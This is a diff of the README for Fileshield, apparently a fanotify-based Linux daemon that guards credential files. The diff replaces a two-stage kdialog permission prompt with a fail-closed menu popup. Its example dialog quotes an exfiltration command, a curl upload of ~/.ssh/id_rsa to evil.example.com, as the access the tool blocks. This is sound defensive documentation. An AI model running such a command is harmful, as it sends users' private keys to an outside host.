@@ -85,7 +85,7 @@ Process syscall: open("/home/user/.aws/credentials", O_RDONLY)
        └─ digest unavailable ─────▶ fall through to the dialog (fail closed)
         │
         ▼
-  no rule matched → two-stage kdialog popup
+  no rule matched → kdialog --menu popup (selection on stdout)
         │
         ├─ Allow Once ───────────▶ FAN_ALLOW (cached for user_ttl)
         ├─ Allow  → Session ─────▶ FAN_ALLOW (until terminal closes)
@@ -336,39 +336,38 @@ An attacker can trigger these notifications, so delivery is bounded by two setti
 When an unknown process (e.g., `curl` spawned from `/tmp`) tries to open `/home/user/.ssh/id_rsa`:
 
 1. The kernel suspends the `open()` call.
-2. A two-stage popup appears. Stage 1 shows what is known about the access; its buttons are **Allow Once**, **Allow…** and **Deny…**:
+2. A menu popup appears listing every scope as its own row, with the access details above it:
 
    ```text
    Process curl (PID 4521, parent: bash (PID 4518)) wants to read:
-   /home/user/.ssh/id_rsa
 
    Binary:   /tmp/curl
    Command:  curl -s https://evil.example.com --upload-file /home/user/.ssh/id_rsa
+   Path:     /home/user/.ssh/id_rsa
 
-   • Allow Once — this file for 300 seconds (this process)
-   • Allow      — choose session or permanent access
-   • Deny       — choose this time, session or permanent
+   • Allow Once — this file and process, cached 300 seconds
+   • Allow Session — this binary and file, until the requesting session ends
+   • Allow Always — saved permanently for this command and file
+   • Deny rows block with the same scopes
+   Cancelling or closing this dialog, or any failure, denies this attempt only.
+
+   [Allow Once - this file and process, cached 300 seconds]
+   [Allow Session - this binary and file until the session ends]
+   [Allow Always - saved permanently for this command and file]
+   [Deny Once - block this access only]
+   [Deny Session - block this binary and file until the session ends]
+   [Deny Always - block permanently for this command and file]
    ```
 
-   Choosing **Allow…** opens stage 2 (grants) with the same binary, command and
-   file repeated, so the scope decision never loses context. Its buttons are
-   **Allow Session**, **Allow Always** and **Deny**:
+   Each row repeats its scope's concise description inline, so the
+   decision never depends on re-reading the block above.
 
-   ```text
-   Allow access to:
-   /home/user/.ssh/id_rsa
-
-   Requested by: curl (PID 4521)
-   Binary:   /tmp/curl
-   Command:  curl -s https://evil.example.com --upload-file /home/user/.ssh/id_rsa
-
-   • Allow Session — this binary and file until this session ends
-   • Allow Always  — this file, this command and its call chain, permanently
-   • Deny          — deny this time
-   ```
-
-   Choosing **Deny…** opens the matching deny stage (**Deny Session**,
-   **Deny Always**, **Deny Once**).
+   The selection is reported by kdialog on **stdout** (the chosen row's
+   tag) together with a zero exit code — the only way a grant can happen.
+   Every failure mode (cancel, window close, timeout, runtime error, even
+   kdialog exiting 1 the way it does for some internal errors) leaves
+   stdout empty, which means: deny this attempt. Nothing persists unless
+   you deliberately pick a row that says it persists.
 
 3. **Deny Once** → `FAN_DENY` — the process receives `EPERM`, the file is never read.
 4. **Allow once** → `FAN_ALLOW` — access is granted and cached for this process and this exact file for `user_ttl` seconds.
@@ -476,7 +475,7 @@ sudo cat /var/lib/fileshield/runtime-denylist.json | jq .
 2. It registers `FAN_OPEN_PERM | FAN_EVENT_ON_CHILD` marks on each protected path via `fanotify_mark()` (the child flag lets directory marks report accesses to their entries).
 3. When a process opens a watched file, the kernel delivers a `fanotify_event_metadata` event and **blocks the calling process**.
 4. The daemon resolves the binary path via `/proc/<pid>/exe` and evaluates the decision pipeline (config denylist, session/permanent denials, file cache, session/permanent grants, `[unsafe_allowlist]`, then the hash-pinned `[allowlist]`). Config-rule hits additionally raise the bounded `notify-send` tripwires described under [Notifications](#notifications).
-5. On a miss, it spawns a `kdialog` two-stage popup on the requesting user's desktop session and waits for user input. The session is detected per prompt and applied only in the dialog child (the daemon's own environment is never modified), so a prompt for one user's process cannot appear on another user's desktop.
+5. On a miss, it spawns a `kdialog --menu` popup on the requesting user's desktop session and reads the chosen row's tag from the dialog's stdout; a selection (zero exit + a known tag) is the only way to grant, so cancel, timeout, window close and any runtime failure deny the access (fail closed). The session is detected per prompt and applied only in the dialog child (the daemon's own environment is never modified), so a prompt for one user's process cannot appear on another user's desktop.
 6. It writes a `struct fanotify_response` with `FAN_ALLOW` or `FAN_DENY` back to the fanotify fd.
 7. The kernel unblocks the original syscall with the appropriate result.
 
@@ -648,7 +647,7 @@ Builds and runs `tests/bench_hotpath.c`, the microbenchmarks for the per-event h
 
 - **No popups appear?** The daemon auto-detects the Wayland socket and D-Bus address under `/run/user/<uid>/`. Verify the desktop session is active and `kdialog` is installed (`apt install kdialog` / `dnf install kdialog`). If kdialog is missing or fails, access is denied (fail closed).
 - **Dialog does not match your theme?** The daemon runs as root with a bare environment, so Fileshield forwards a whitelist of your session's appearance variables (`XDG_CURRENT_DESKTOP`, `KDE_FULL_SESSION`/`KDE_SESSION_VERSION`, `QT_QPA_PLATFORMTHEME`, `QT_STYLE_OVERRIDE`, scale factors, locale, cursor) into the dialog child after it drops to your user. On Plasma/KDE this makes kdialog use your color scheme and fonts automatically. On other desktops the dialog follows the system theme only if a Qt platform theme integration is installed (e.g. `qgnomeplatform`/adwaita-qt for GNOME, `qt6ct`); without one Qt falls back to its default light theme.
-- **Dialog behavior on failure**: timeouts, exec failures and Cancel/window close deny the access. On the stage-2 Allow dialog, `Allow Always` sits on the No button (kdialog exit code 1), which kdialog also returns for some runtime errors — a documented, accepted trade-off; `Allow Session` remains on Yes, and timeouts/exec failures always fail closed. On the stage-1 dialog the same ambiguity (a runtime error reporting exit 1) maps to "No" and opens the grant-scope dialog instead of denying outright — the end state is still user-gated, and stage 2's own failures deny.
+- **Dialog behavior on failure**: the access prompt is a `kdialog --menu`; the decision is the selected row's tag read from the dialog's **stdout** together with a zero exit code. Cancel, window close, the 30 s timeout, exec failures and every kdialog runtime error produce no selection and **deny the access (fail closed)** — a grant (even *Allow Once*) requires an explicit row pick. This replaces the old two-stage button flow, whose `Allow Always` sat on the No button (kdialog exit code 1), an exit code kdialog also returns for some runtime errors. The hash-change prompt still uses a Yes/No dialog: **Yes** updates the pin, and every other outcome (No, Cancel, timeout, failure) denies this attempt and keeps the old hash.
 - **Access blocked for a trusted process?** Add it to `[allowlist]` in `/etc/fileshield.conf` and run `sudo systemctl reload fileshield`. If the binary is already allowlisted, the prompt may be asking about a hash change — approve it only if you expected the binary to be rebuilt or updated. If the binary cannot be pinned at all (an AppImage or other tmp-mount tool), `[unsafe_allowlist]` is the escape hatch — with the caution described in [Handle with caution](#handle-with-caution). Check `journalctl -u fileshield -n 20` to confirm the reload succeeded.
 - **Daemon fails to start?** Confirm the service runs as root — `fanotify_init` requires `CAP_SYS_ADMIN`. Check `journalctl -u fileshield -p err` for the exact error.
 - **A path is watched but events are not firing?** Verify the mark was added successfully (`journalctl -t fileshield | grep "mark added"`). Paths on NFS/CIFS mounts or inside containers are not supported by fanotify.
